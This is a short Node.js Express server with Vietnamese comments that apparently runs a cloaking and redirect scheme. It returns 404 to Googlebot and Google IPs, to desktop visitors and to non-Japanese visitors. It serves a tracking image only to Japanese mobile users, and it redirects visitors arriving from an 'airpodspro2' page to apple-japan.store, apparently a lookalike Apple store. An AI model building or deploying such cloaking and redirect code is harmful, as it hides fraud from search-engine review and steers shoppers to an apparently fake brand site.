const express = require("express");
const axios = require("axios");
const app = express();

// Danh sách Googlebot
const googleBots = [
    "googlebot", "adsbot-google", "mediapartners-google",
    "google-structured-data-testing-tool", "google-inspectiontool",
    "google-merchant-center", "google-shopping", "google-ads"
];

// Danh sách thiết bị di động
const mobileDevices = ["iphone", "ipad", "ipod", "android", "blackberry", "windows phone"];

// API kiểm tra IP có phải của Googlebot không
async function isGoogleIP(ip) {
    try {
        const response = await axios.get(`https://dns.google/resolve?name=${ip}.in-addr.arpa&type=PTR`);
        const hostnames = response.data.Answer ? response.data.Answer.map(ans => ans.data) : [];
        return hostnames.some(host => host.includes("googlebot.com") || host.includes("google.com"));
    } catch (error) {
        return false;
    }
}

// API kiểm tra quốc gia theo IP
async function getCountry(ip) {
    try {
        const response = await axios.get(`https://get.geojs.io/v1/ip/country/${ip}.json`);
        return response.data ? response.data.country : null;
    } catch (error) {
        return null;
    }
}

// Route trả về ảnh tracking
app.get("/check.png", async (req, res) => {
    const userAgent = req.headers["user-agent"] ? req.headers["user-agent"].toLowerCase() : "";
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

    // Kiểm tra Googlebot
    if (googleBots.some(bot => userAgent.includes(bot))) return res.sendStatus(404);
    if (await isGoogleIP(ip)) return res.sendStatus(404);

    // Kiểm tra thiết bị có phải điện thoại
    if (!mobileDevices.some(device => userAgent.includes(device))) return res.sendStatus(404);

    // Kiểm tra IP có phải từ Nhật Bản
    const country = await getCountry(ip);
    if (country !== "JP") return res.sendStatus(404);

    // Nếu hợp lệ, trả về ảnh tracking
    res.sendFile(__dirname + "/tracking.png");
});

// API WebSocket
app.get("/ws", (req, res) => {
    const url = req.headers.referer ? req.headers.referer.toLowerCase() : "";

    if (url.includes("airpodspro2")) {
        return res.json({ redirect: "https://apple-japan.store/apple-airpods-pro%ef%bc%88%e7%ac%ac2%e4%b8%96%e4%bb%a3%ef%bc%89-magsafe%e5%85%85%e9%9b%bb%e3%82%b1%e3%83%bc%e3%82%b9-%e5%a4%a7/" });
    }
    res.json({ redirect: null });
});

// Chạy server
module.exports = app;
